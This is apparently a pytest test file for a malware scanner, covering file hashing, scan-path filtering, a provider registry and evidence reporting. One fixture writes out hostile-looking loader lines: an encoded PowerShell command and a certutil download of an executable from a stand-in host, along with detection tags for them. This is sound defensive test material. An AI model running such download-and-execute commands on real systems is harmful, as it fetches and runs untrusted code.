from __future__ import annotations

import hashlib
from pathlib import Path

import pytest

from Virus_Scan.contracts.file_fingerprint import sha256_file, source_fingerprint
from Virus_Scan.contracts.path_identity import should_include_scan_path
from Virus_Scan.reporting.compact import cli_human_evidence_lines
from Virus_Scan.runtime.scan_dependencies import ScanDependencyRegistry


def test_file_fingerprint_public_contract_hashes_existing_file_and_fail_closed_missing_path(tmp_path: Path) -> None:
    sample = tmp_path / "payload.bin"
    payload = b"UMIGE\x00test\xffpayload"
    sample.write_bytes(payload)

    expected_sha = hashlib.sha256(payload).hexdigest()
    assert sha256_file(sample, chunk_size=4) == expected_sha

    fingerprint = source_fingerprint(sample)
    assert fingerprint["path"] == str(sample.resolve())
    assert fingerprint["size"] == len(payload)
    assert fingerprint["sha256"] == expected_sha
    assert isinstance(fingerprint["mtime"], int)

    missing = tmp_path / "missing.bin"
    missing_fingerprint = source_fingerprint(missing)
    assert missing_fingerprint == {
        "path": str(missing.resolve()),
        "size": 0,
        "mtime": 0,
        "sha256": "",
    }


def test_scan_path_policy_blocks_generated_artifacts_only_inside_scan_root(tmp_path: Path) -> None:
    host_temp_scan_root = tmp_path / "Temp" / "GameRoot"
    legitimate_game_file = host_temp_scan_root / "www" / "data" / "Map001.json"
    generated_temp_artifact = host_temp_scan_root / "Temp" / "queue_state.tmp"
    generated_results_artifact = host_temp_scan_root / "Scan Logs" / "scan_results.json"

    assert should_include_scan_path(legitimate_game_file, scan_root=host_temp_scan_root) is True
    assert should_include_scan_path(generated_temp_artifact, scan_root=host_temp_scan_root) is False
    assert should_include_scan_path(generated_results_artifact, scan_root=host_temp_scan_root) is False


def test_scan_dependency_registry_is_explicit_and_rejects_unknown_or_non_callable_providers() -> None:
    registry = ScanDependencyRegistry()

    provider = lambda value: f"scanned:{value}"
    assert registry.set_single("scan_strings_provider", provider) is provider
    assert registry.get_single("scan_strings_provider")("sample") == "scanned:sample"

    with pytest.raises(TypeError, match="provider must be callable"):
        registry.set_single("scan_strings_provider", object())  # type: ignore[arg-type]
    with pytest.raises(KeyError, match="unknown scan dependency provider"):
        registry.set_single("unknown_provider", provider)
    with pytest.raises(KeyError, match="unknown scan dependency provider"):
        registry.get_single("unknown_provider")

    raw_queue = lambda: "queue"
    updated = registry.update_group(
        "intrastage_provider",
        {"run_raw_task_queue": raw_queue, "ignored_non_callable": object()},  # type: ignore[dict-item]
    )
    assert updated == {"run_raw_task_queue": raw_queue}
    assert registry.get_group_provider("intrastage_provider", "run_raw_task_queue") is raw_queue
    assert registry.get_group_provider("intrastage_provider", "ignored_non_callable") is None
    with pytest.raises(KeyError, match="unknown scan dependency provider group"):
        registry.update_group("unknown_group", {"x": raw_queue})


def test_compact_reporting_evidence_lines_surface_trigger_context_without_mutating_result(tmp_path: Path) -> None:
    sample = tmp_path / "loader.ps1"
    sample.write_text(
        "powershell.exe -EncodedCommand SQBFAFgA https://example.test/payload.bin\n"
        "cmd.exe /c certutil -urlcache -f https://example.test/a.exe a.exe\n",
        encoding="utf-8",
    )
    result = {
        "tags": [
            "encoded_powershell",
            "powershell_exec",
            "network_download",
            "cmd_exec",
            "certutil_exec",
            "yara_match",
        ],
        "score": 88,
        "yara_hits": ["SuspiciousPowerShellLoader"],
    }
    before = {key: list(value) if isinstance(value, list) else value for key, value in result.items()}

    lines = cli_human_evidence_lines(sample, result, max_lines=8)

    assert any(line.startswith("Url: https://example.test/payload.bin") for line in lines)
    assert any(line.startswith("PowerShell:") and "powershell.exe" in line.lower() for line in lines)
    assert any(line.startswith("Command:") and "cmd.exe" in line.lower() for line in lines)
    assert any(line == "YARA: SuspiciousPowerShellLoader" for line in lines)
    assert result == before
